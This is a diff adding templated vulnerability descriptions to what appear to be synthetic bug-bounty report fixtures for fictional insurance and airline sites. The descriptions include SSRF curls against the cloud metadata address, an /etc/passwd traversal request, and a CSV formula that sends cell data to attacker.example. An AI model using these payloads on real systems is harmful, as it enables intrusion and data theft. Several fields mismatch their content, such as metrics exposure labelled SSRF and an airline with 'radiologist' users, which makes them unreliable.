+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.silberkamm-insurance.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23478,7 +23655,8 @@
           "offset": "8d",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.silberkamm-insurance.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23630,7 +23808,8 @@
           "offset": "2h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.silberkamm-insurance.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -23773,7 +23952,8 @@
           "offset": "5d 4h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.silberkamm-insurance.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/sonnenhafen_airlines_ag_reports.json b/fixtures/reports/sonnenhafen_airlines_ag_reports.json
index 6828c42..799638d 100644
--- a/fixtures/reports/sonnenhafen_airlines_ag_reports.json
+++ b/fixtures/reports/sonnenhafen_airlines_ag_reports.json
@@ -62,7 +62,8 @@
           "offset": "4d 12h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.sonnenhafen-airlines.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -198,7 +199,8 @@
           "offset": "7d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://checkin.sonnenhafen-airlines.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -289,7 +291,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.sonnenhafen-airlines.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -433,7 +436,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://booking.sonnenhafen-airlines.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -537,7 +541,8 @@
           "offset": "3d 19h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://booking.sonnenhafen-airlines.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -643,7 +648,8 @@
           "offset": "2d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://checkin.sonnenhafen-airlines.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -785,7 +791,8 @@
           "offset": "6d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://booking.sonnenhafen-airlines.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -916,7 +923,8 @@
           "offset": "7d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.sonnenhafen-airlines.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1036,7 +1044,8 @@
           "offset": "2d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.sonnenhafen-airlines.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1132,7 +1141,8 @@
           "offset": "1d 21h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.sonnenhafen-airlines.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1248,7 +1258,8 @@
           "offset": "15h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.sonnenhafen-airlines.foo/import`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1408,7 +1419,8 @@
           "offset": "9d 8h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.sonnenhafen-airlines.foo/import`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1568,7 +1580,8 @@
           "offset": "2d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://booking.sonnenhafen-airlines.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1727,7 +1740,8 @@
           "offset": "5d 1h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://checkin.sonnenhafen-airlines.foo/export`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1831,7 +1845,8 @@
           "offset": "1d 21h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.sonnenhafen-airlines.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1971,7 +1986,8 @@
           "offset": "2d 20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.sonnenhafen-airlines.foo/import`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2119,7 +2135,8 @@
           "offset": "3d 17h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://booking.sonnenhafen-airlines.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2254,7 +2271,8 @@
           "offset": "1d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://checkin.sonnenhafen-airlines.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2398,7 +2416,8 @@
           "offset": "4d 3h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://checkin.sonnenhafen-airlines.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2511,7 +2530,8 @@
           "offset": "22h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://checkin.sonnenhafen-airlines.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2625,7 +2645,8 @@
           "offset": "1d 7h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://booking.sonnenhafen-airlines.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2720,7 +2741,8 @@
           "offset": "2d 9h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://booking.sonnenhafen-airlines.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2819,7 +2841,8 @@
           "offset": "3d 18h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://checkin.sonnenhafen-airlines.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2935,7 +2958,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://checkin.sonnenhafen-airlines.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3107,7 +3131,8 @@
           "offset": "8d 13h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.sonnenhafen-airlines.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3229,7 +3254,8 @@
           "offset": "6d 10h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://checkin.sonnenhafen-airlines.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3356,7 +3382,8 @@
           "offset": "3d 12h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
